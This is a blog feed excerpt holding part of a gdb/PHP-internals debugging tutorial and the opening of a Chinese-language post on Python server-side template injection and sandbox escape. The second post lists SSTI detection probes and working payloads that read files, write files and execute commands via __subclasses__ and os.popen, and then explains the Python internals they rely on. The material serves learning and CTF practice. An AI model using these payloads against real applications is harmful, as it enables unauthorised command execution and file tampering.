class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) delete 1</span><br><span class="line">(gdb) info break</span><br><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">2       breakpoint     keep y   0x0000000000400575 in main at eg1.c:17</span><br></pre></td></tr></table></figure></p><p>我们重新使用run，这时候程序将会终端在我们设置断点的位置，我们可也使用print 将wib 函数的 参数打印出来，当然我们同样可以使用<code>info locals</code>命令将局部变量值打印出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run</span><br><span class="line">Starting program: /root/gbk_test/eg1 </span><br><span class="line"></span><br><span class="line">Breakpoint 2, main (argc=1, argv=0x7fffffffe5a8) at eg1.c:17</span><br><span class="line">17    result = wib(value, div);</span><br><span class="line">(gdb) print value </span><br><span class="line">$3 = 10</span><br><span class="line">(gdb) print div</span><br><span class="line">$4 = 6</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info locals</span><br><span class="line">value = 10</span><br><span class="line">div = 6</span><br><span class="line">result = 0</span><br><span class="line">i = 0</span><br><span class="line">total = 0</span><br></pre></td></tr></table></figure><p>我们可以使用<code>next</code>进入函数中查看value div两变量的变化情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">(gdb) next</span><br><span class="line">18    total += result;</span><br><span class="line">(gdb) </span><br><span class="line">19    div++;</span><br><span class="line">(gdb) </span><br><span class="line">20    value--;</span><br><span class="line">(gdb) </span><br><span class="line">15  for(i = 0; i &lt; 10; i++)</span><br><span class="line">(gdb) </span><br><span class="line"></span><br><span class="line">Breakpoint 2, main (argc=1, argv=0x7fffffffe5a8) at eg1.c:17</span><br><span class="line">17    result = wib(value, div);</span><br><span class="line">(gdb) </span><br><span class="line">18    total += result;</span><br><span class="line">(gdb) </span><br><span class="line">19    div++;</span><br><span class="line">(gdb) </span><br><span class="line">20    value--;</span><br><span class="line">(gdb) </span><br><span class="line">15  for(i = 0; i &lt; 10; i++)</span><br><span class="line">(gdb) </span><br><span class="line"></span><br><span class="line">Breakpoint 2, main (argc=1, argv=0x7fffffffe5a8) at eg1.c:17</span><br><span class="line">17    result = wib(value, div);</span><br><span class="line">(gdb) print value</span><br><span class="line">$5 = 8</span><br><span class="line">(gdb) print div</span><br><span class="line">$6 = 8</span><br></pre></td></tr></table></figure></p><p>在连续两次后 我们发现 value以及div的值都为8，继续使用next，我们可以得出结论当value与div值相等的时候程序会发生算术错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGFPE, Arithmetic exception.</span><br><span class="line">0x000000000040053d in wib (no1=8, no2=8) at eg1.c:6</span><br><span class="line">6  result = no1 / diff;</span><br></pre></td></tr></table></figure></p><p>我们重新run一次，这次我们使用condition命令，这样我们就不需要多次使用next查看，这样我们就一次就可以得到我们想要的结果了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run </span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line">Starting program: /root/gbk_test/eg1 </span><br><span class="line"></span><br><span class="line">Breakpoint 2, main (argc=1, argv=0x7fffffffe5a8) at eg1.c:17</span><br><span class="line">17    result = wib(value, div);</span><br><span class="line">(gdb) print value</span><br><span class="line">$8 = 8</span><br></pre></td></tr></table></figure></p><h2 id="使用gdb调试php源码"><a href="#使用gdb调试php源码" class="headerlink" title="使用gdb调试php源码"></a>使用gdb调试php源码</h2><p>源码编译安装php 重要事情说100遍</p><h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><p>PHP内部，变量都会用一个zval的结构体（struct）来表示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _zval_struct &#123;</span><br><span class="line">    zvalue_value value;</span><br><span class="line">    zend_uint refcount__gc;</span><br><span class="line">    zend_uchar type;</span><br><span class="line">    zend_uchar is_ref__gc;</span><br><span class="line">&#125; zval;</span><br></pre></td></tr></table></figure></p><p>其中用于保存变量的值的字段是value，它的类型是zvalue_value，这是一个联合体(union)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">typedef union _zvalue_value &#123;</span><br><span class="line">    long lval;</span><br><span class="line">    double dval;</span><br><span class="line">    struct &#123;</span><br><span class="line">        char *val;</span><br><span class="line">        int len;</span><br><span class="line">    &#125; str;</span><br><span class="line">    HashTable *ht;</span><br><span class="line">    zend_object_value obj;</span><br><span class="line">&#125; zvalue_value;</span><br></pre></td></tr></table></figure></p><p>如果变量的类型为整型，则使用lval这个字段存储它的值，如果是浮点型，则使用dval存储它的值。在zval结构体中有一个zend_uchar型的字段type来标识变量的类型，PHP内部提供了一些宏来表示变量的类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Type tagStorage location</span><br><span class="line">IS_NULL        none   </span><br><span class="line">IS_BOOL        long   lval</span><br><span class="line">IS_LONG        long   lval</span><br><span class="line">IS_DOUBLEdouble dval</span><br><span class="line">IS_STRINGstruct &#123; char *val; int len; &#125; str</span><br><span class="line">IS_ARRAYHashTable *ht</span><br><span class="line">IS_OBJECTzend_object_value obj</span><br><span class="line">IS_RESOURCElong lval</span><br></pre></td></tr></table></figure><h3 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h3><p>让我们继续探索下php弱类型（以下面一个例子就好了，以下结果会返回true）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./php -r &apos;var_dump([]&gt;1);&apos;</span><br></pre></td></tr></table></figure></p><p>我们将断点设在<code>is_smaller_function</code>，至于为什么，我之前文章有提及，run，list<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">2177ZEND_API int ZEND_FASTCALL is_smaller_function(zval *result, zval *op1, zval *op2) /* &#123;&#123;&#123; */</span><br><span class="line">2178&#123;</span><br><span class="line">2179if (compare_function(result, op1, op2) == FAILURE) &#123;</span><br><span class="line">2180return FAILURE;</span><br><span class="line">2181&#125;</span><br><span class="line">2182ZVAL_BOOL(result, (Z_LVAL_P(result) &lt; 0));</span><br><span class="line">(gdb) </span><br><span class="line">2183return SUCCESS;</span><br><span class="line">2184&#125;</span><br><span class="line">2185/* &#125;&#125;&#125; */</span><br></pre></td></tr></table></figure></p><p>这里很显然使用compare_function进行比较，我们再次设置断点，continue，我们将 这三个变量打印出来<code>zval *result, zval *op1, zval *op2</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print *result</span><br><span class="line">$1 = &#123;value = &#123;lval = 20888608, dval = 1.0320343602244629e-316, counted = 0x13ebc20 &lt;compiler_globals&gt;, str = 0x13ebc20 &lt;compiler_globals&gt;, </span><br><span class="line">    arr = 0x13ebc20 &lt;compiler_globals&gt;, obj = 0x13ebc20 &lt;compiler_globals&gt;, res = 0x13ebc20 &lt;compiler_globals&gt;, ref = 0x13ebc20 &lt;compiler_globals&gt;, </span><br><span class="line">    ast = 0x13ebc20 &lt;compiler_globals&gt;, zv = 0x13ebc20 &lt;compiler_globals&gt;, ptr = 0x13ebc20 &lt;compiler_globals&gt;, ce = 0x13ebc20 &lt;compiler_globals&gt;, </span><br><span class="line">    func = 0x13ebc20 &lt;compiler_globals&gt;, ww = &#123;w1 = 20888608, w2 = 0&#125;&#125;, u1 = &#123;v = &#123;type = 61 &apos;=&apos;, type_flags = 0 &apos;\000&apos;, const_flags = 0 &apos;\000&apos;, </span><br><span class="line">      reserved = 0 &apos;\000&apos;&#125;, type_info = 61&#125;, u2 = &#123;next = 0, cache_slot = 0, lineno = 0, num_args = 0, fe_pos = 0, fe_iter_idx = 0, access_flags = 0, </span><br><span class="line">    property_guard = 0, extra = 0&#125;&#125;</span><br><span class="line">(gdb) print *op1</span><br><span class="line">$2 = &#123;value = &#123;lval = -1, dval = -nan(0xfffffffffffff), counted = 0xffffffffffffffff, str = 0xffffffffffffffff, arr = 0xffffffffffffffff, </span><br><span class="line">    obj = 0xffffffffffffffff, res = 0xffffffffffffffff, ref = 0xffffffffffffffff, ast = 0xffffffffffffffff, zv = 0xffffffffffffffff, ptr = 0xffffffffffffffff, </span><br><span class="line">    ce = 0xffffffffffffffff, func = 0xffffffffffffffff, ww = &#123;w1 = 4294967295, w2 = 4294967295&#125;&#125;, u1 = &#123;v = &#123;type = 4 &apos;\004&apos;, type_flags = 0 &apos;\000&apos;, </span><br><span class="line">      const_flags = 0 &apos;\000&apos;, reserved = 0 &apos;\000&apos;&#125;, type_info = 4&#125;, u2 = &#123;next = 0, cache_slot = 0, lineno = 0, num_args = 0, fe_pos = 0, fe_iter_idx = 0, </span><br><span class="line">    access_flags = 0, property_guard = 0, extra = 0&#125;&#125;</span><br><span class="line">(gdb) print *op2</span><br><span class="line">$3 = &#123;value = &#123;lval = 140737184649664, dval = 6.9533408027815013e-310, counted = 0x7fffede5d1c0, str = 0x7fffede5d1c0, arr = 0x7fffede5d1c0, obj = 0x7fffede5d1c0, </span><br><span class="line">    res = 0x7fffede5d1c0, ref = 0x7fffede5d1c0, ast = 0x7fffede5d1c0, zv = 0x7fffede5d1c0, ptr = 0x7fffede5d1c0, ce = 0x7fffede5d1c0, func = 0x7fffede5d1c0, ww = &#123;</span><br><span class="line">      w1 = 3991261632, w2 = 32767&#125;&#125;, u1 = &#123;v = &#123;type = 7 &apos;\a&apos;, type_flags = 20 &apos;\024&apos;, const_flags = 0 &apos;\000&apos;, reserved = 0 &apos;\000&apos;&#125;, type_info = 5127&#125;, u2 = &#123;</span><br><span class="line">    next = 32767, cache_slot = 32767, lineno = 32767, num_args = 32767, fe_pos = 32767, fe_iter_idx = 32767, access_flags = 32767, property_guard = 32767, </span><br><span class="line">    extra = 32767&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>进入compare_function，next<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zendi_convert_scalar_to_number(op2, op2_copy, result, 1);</span><br></pre></td></tr></table></figure></p><p>可以看到这里进行了类型转化将op2转化成number，break zendi_convert_scalar_to_number</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.ibm.com/developerworks/cn/linux/sdk/gdb/index.html" target="_blank" rel="noopener"><br>使用 GDB 调试 Linux 软件</a></p><p><a href="https://gywbd.github.io/posts/2016/2/debug-php-source-code.html" target="_blank" rel="noopener">调式PHP源码 </a><br><a href="http://www.shanghai.ws/gnu/gcc_1.htm" target="_blank" rel="noopener">GNU GCC中文文档</a><br><a href="http://gywbd.github.io/posts/2016/2/zend-execution-engine.html" target="_blank" rel="noopener">深入理解Zend执行引擎（PHP5）</a><br><a href="https://blog.izgq.net/archives/910/" target="_blank" rel="noopener">Ubuntu 16.04 编译安装 PHP 7.2</a></p>]]></content>
    
    <summary type="html">
    
      从零开始学习使用gdb调试PHP源码
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="PHP内核分析" scheme="https://museljh.github.io/tags/PHP%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
    
      <category term="gdb" scheme="https://museljh.github.io/tags/gdb/"/>
    
  </entry>
  
  <entry>
    <title>Python服务端模板注入与沙盒逃逸的学习小结与实践</title>
    <link href="https://museljh.github.io/2019/03/20/Python%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%9E%E8%B7%B5/"/>
    <id>https://museljh.github.io/2019/03/20/Python服务端模板注入与沙盒逃逸的学习总结与实践/</id>
    <published>2019-03-19T16:47:46.000Z</published>
    <updated>2019-03-19T16:49:21.214Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>就注入类型的漏洞来说，常见 Web 注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等。注入漏洞的实质是服务端接受了用户的输入，未过滤或过滤不严谨执行了拼接了用户输入的代码，因此造成了各类注入。</p><p>正常而言，出于安全考虑，模板引擎基本上都是拥有沙盒、命名空间的，代码的解析执行都是发生在有限的沙盒里面，因此，沙盒逃逸也成为 SSTI 不可或缺的存在。</p><p>这里其实主要讲关于沙盒逃逸的，因为模板注入的话，我自己看哪些模板引擎的源码也不是非常懂里面到底写什么，很难比较深入的阐述，因为一般来说沙盒逃逸经常伴随着模板注入所以这里模板注入还是提一提，总的来说这篇其实是对沙盒逃逸常见payload的讲解。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="服务端模板注入"><a href="#服务端模板注入" class="headerlink" title="服务端模板注入"></a>服务端模板注入</h3><p>通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式。服务端模板注入，顾名思义，就是通过在服务端的模板文件或模板字符串中注入特定的恶意代码导致产生代码执行的一种漏洞攻击方式。<br>不同的模板引擎，根据不同的解析方式相应的也是存在不同的利用方法。</p><h3 id="服务端模板注入漏洞探测"><a href="#服务端模板注入漏洞探测" class="headerlink" title="服务端模板注入漏洞探测"></a>服务端模板注入漏洞探测</h3><p>详细来自</p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28823933</a></p></blockquote><p>漏洞一般出现在这两种情况下，而每种有不同的探测手法：<br>文本类<br>大部分的模板语言支持我们输入 HTML，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smarty=Hello &#123;user.name&#125;</span><br><span class="line">Hello user1</span><br><span class="line"> </span><br><span class="line">freemarker=Hello $&#123;username&#125;</span><br><span class="line">Hello newuser</span><br><span class="line"> </span><br><span class="line">any=&lt;b&gt;Hello&lt;/b&gt;</span><br><span class="line">&lt;b&gt;Hello&lt;b&gt;</span><br></pre></td></tr></table></figure><p>代码类<br>在一些环境下，用户的输入也会被当作模板的可执行代码。比如说变量名：</p><blockquote><p>personal_greeting=username<br>Hello user01</p></blockquote><p>我们可以通过破坏 template 语句，并附加注入的HTML标签以确认漏洞：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">personal_greeting=username&lt;tag&gt;</span><br><span class="line">Hello</span><br><span class="line">personal_greeting=username&#125;&#125;&lt;tag&gt;</span><br><span class="line">Hello user01 &lt;tag&gt;</span><br></pre></td></tr></table></figure></p><h2 id="为什么模板注入可以使用沙盒绕过"><a href="#为什么模板注入可以使用沙盒绕过" class="headerlink" title="为什么模板注入可以使用沙盒绕过"></a>为什么模板注入可以使用沙盒绕过</h2><p>模板支持对应语言的“编程功能”以及一些简单的运算<br>模板并不是静态的放进去，虽然模板产品类型很多，但或多或少都能执行一些逻辑</p><blockquote><p>name=20   name=4</p></blockquote><p>而在python的Jinja2模板中，就能支持更多更强大的逻辑：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from jinja2 import Template</span><br><span class="line">str = &quot;&#123;% for i in [1,2,3] %&#125;&#123;&#123; i &#125;&#125;&#123;% endfor %&#125;&quot;</span><br><span class="line">template = Template(&apos;your input: &#123;&#125;&apos;.format(str))</span><br><span class="line">print (template.render())</span><br></pre></td></tr></table></figure></p><p>其实我个人理解，就是在一些模板引擎中会有注册一些自己使用模块，没有注册的模块是不能使用的，所以沙盒逃逸其实就是一种被限制情况下的python终端</p><h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><h4 id="SSTI-in-Tornado"><a href="#SSTI-in-Tornado" class="headerlink" title="SSTI in Tornado"></a>SSTI in Tornado</h4><p>护网杯 2018 WEB (1) easy_tornado<br>详解 &gt;<a href="https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html#toc-4" target="_blank" rel="noopener">https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html#toc-4</a></p><h3 id="沙盒技术"><a href="#沙盒技术" class="headerlink" title="沙盒技术"></a>沙盒技术</h3><p>实际上，沙盒就是一种类似影子系统的虚拟系统环境，它比带有宿主的虚拟机有着更深层次的系统内核级技术。它可以接管恶意软件的功能调用接口或函数行为，并且在确认了病毒行为之后实行回滚机制，并让系统保持一种干净的状态。详细可以看<a href="https://www.anquanke.com/post/id/85672" target="_blank" rel="noopener">这里</a></p><h3 id="python沙盒逃逸概述"><a href="#python沙盒逃逸概述" class="headerlink" title="python沙盒逃逸概述"></a>python沙盒逃逸概述</h3><p>沙箱逃逸,可以认为是从一个被限制的python环境绕过种种过滤和限制最周拿到更高权限甚至getshell，这是我们的最终的目的，但是实现这个目标之前我们必须解决的就是如何绕过重重的waf去使用python执行命令</p><p>这是我在K0rz3n师傅博客里看到的一段攻防可以很形象的描述，可以推荐先看看，<a href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/" target="_blank" rel="noopener">传送门</a></p><p>沙盒逃逸就是要在这样一种受到到限制的情况下，不断绕过限制最终达成getshell等目的</p><p>想要深入了解沙盒逃逸，python魔法方法肯定是要知道的，不然很容易知其然不知其所以然，一旦题目有了一定变化就容易不知所措。<br>1.魔法方法简介<br>我觉得想要较为深入了解python沙盒逃逸的内容必须先了解下python魔法方法，关于这些魔术方法在下面需要的时候我会讲解。</p><h3 id="沙盒逃逸"><a href="#沙盒逃逸" class="headerlink" title="沙盒逃逸"></a>沙盒逃逸</h3><h4 id="常见-payload1"><a href="#常见-payload1" class="headerlink" title="常见 payload1"></a>常见 payload1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#读文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](r&apos;C:\1.php&apos;).read()</span><br><span class="line"></span><br><span class="line">#写文件</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](&apos;/var/www/html/input&apos;, &apos;w&apos;).write(&apos;123&apos;)</span><br><span class="line"></span><br><span class="line">#执行任意命令</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&apos; )</span><br></pre></td></tr></table></figure><h4 id="1-1-xxx"><a href="#1-1-xxx" class="headerlink" title="1.1.().xxx"></a>1.1.<code>().xxx</code></h4><p>在一些沙盒逃逸的pyload中经常会出现’ ‘.xxx.xxx.xx或者是().xxx.xxx.xxx,[].xxx.xxx.xx<br>如果不是比较了解python的话理解起来其实是比较困难的<br>我现在来讲解下<br>首先type下‘ ’，和() ,[]<br><img src="https://i.imgur.com/TLY4Hqu.png" alt=""></p><blockquote><p>tuple是一种有序列表叫元组，和list非常类似，但是tuple一旦初始化就不能修改</p></blockquote><h4 id="1-2-class"><a href="#1-2-class" class="headerlink" title="1.2. ().__class__"></a>1.2. <code>().__class__</code></h4><p>().__class__是什么意思呢？当然想要明白这个问题首先我们得先知道下typle与__class__的差别</p><ul><li>type()<br>type 这个类实例化了一切，包括 object 和 他自己<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; type(1)</span><br><span class="line">&lt;class &apos;int&apos;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; type(int)</span><br><span class="line">&lt;class &apos;type&apos;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; type(type)</span><br><span class="line">&lt;class &apos;type&apos;&gt;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; type(object)</span><br><span class="line">&lt;class &apos;type&apos;&gt;</span><br></pre></td></tr></table></figure></li></ul><p>结论：<br>type-&gt;class-&gt;obj<br>2.object<br>object 是最顶层的基类，所有的类都继承了Object，包括type<br><img src="https://i.imgur.com/BjatiKo.png" alt=""><br>但是 object 是由 type 实例化的</p><p>示例代码：<br><img src="https://i.imgur.com/k9Lh8bu.png" alt=""></p><ul><li>__class__</li></ul><p>__class__与type()极为接近，但是有一定差别</p><p>(1)我们可以从一个对象实例到他的类<br>‘ ‘.__class__<br><img src="https://i.imgur.com/TLY4Hqu.png" alt=""></p><p><img src="https://i.imgur.com/1FJQMEp.png" alt=""></p><p>仅仅从上面两个例子确实是很难看出type与__class__之间的区别，不过我们这里姑且暂时简单将其理解为是type（）<br>想要具体了解的可以看这里</p><blockquote><p><a href="http://brionas.github.io/2014/09/15/python-type-class/" target="_blank" rel="noopener">http://brionas.github.io/2014/09/15/python-type-class/</a></p></blockquote><h4 id="1-3-class-bases-0"><a href="#1-3-class-bases-0" class="headerlink" title="1.3. ().__class__.__bases__[0]"></a>1.3. <code>().__class__.__bases__[0]</code></h4><p>元组，包含 类型对象(type, class) C 的全部基类，类型的实例通常没有属性 __bases__。概念其实是比较难理解的我们直接举例子</p><p><img src="https://i.imgur.com/BjatiKo.png" alt=""></p><p>这里我们可以看到通过__base__我们得到了object对象<br>那么这里又出现了个问题 __base__ 与__bases__有什么区别呢？</p><ul><li><code>__bases[0]__base__</code></li></ul><p>我们定义了两个类，M继承了C。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; &gt;&gt;&gt; class C(object): pass</span><br><span class="line">&gt; ...</span><br><span class="line">&gt; &gt;&gt;&gt; class M(C,type): pass</span><br><span class="line">&gt; ...</span><br><span class="line">&gt; &gt;&gt;&gt; M.__bases__[0]</span><br><span class="line">&gt; &lt;class &apos;__main__.C&apos;&gt;</span><br><span class="line">&gt; &gt;&gt;&gt; M.__base__</span><br><span class="line">&gt; &lt;type &apos;type&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>我们可以看到M.__base__是自己定义的type而 M.__bases__确是C<br>再举个例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class A(object): pass</span><br><span class="line">class B(dict): pass</span><br><span class="line">class C(A, B): pass</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> C.__base__</span><br><span class="line">&lt;class &apos;__main__.B&apos;&gt;</span><br></pre></td></tr></table></figure><p>为什么呢？因为B定义了C的基类所以<code>C.__base__</code>是B</p><blockquote><p>这里要先知道的是一般情况下，python中一个子类只能有一个基类</p></blockquote><p>继续看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class A(object): pass</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; class B(A,type): pass</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; B.__bases__</span><br><span class="line">(&lt;class &apos;__main__.A&apos;&gt;, &lt;type &apos;type&apos;&gt;)</span><br></pre></td></tr></table></figure><p>可以看出<code>B.__bases__</code>的结果是一个元祖，并且自上而下直到B自己的基类。<br>那么<code>__bases__[0]与__base__区别是什么呢？应该有很多人可以直接得出答案了吧？</code><br>同样是上面那个例子，两者区别可以一眼看出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; B.__bases__[0]</span><br><span class="line">&lt;class &apos;__main__.A&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; B.__base__</span><br><span class="line">&lt;type &apos;type&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>再试试多继承,之前的例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class A(object): pass</span><br><span class="line"></span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; class B(dict): pass</span><br><span class="line"></span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; class C(A, B): pass</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; C.__base__</span><br><span class="line">&lt;class &apos;__main__.B&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; C.__bases__</span><br><span class="line">(&lt;class &apos;__main__.A&apos;&gt;, &lt;class &apos;__main__.B&apos;&gt;)</span><br></pre></td></tr></table></figure><h4 id="1-4-class-bases-0-subclasses-40"><a href="#1-4-class-bases-0-subclasses-40" class="headerlink" title="1.4.().__class__.__bases__[0].()__subclasses__[40]"></a>1.4.<code>().__class__.__bases__[0].()__subclasses__[40]</code></h4><ul><li><code>__subclasses__()</code><br>每个类都保留一个对其直接子类的弱引用列表<br>举两个例子<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; int.__subclasses__()</span><br><span class="line">[&lt;type &apos;bool&apos;&gt;]</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class Foo(object):</span><br><span class="line">...     pass</span><br><span class="line">... </span><br><span 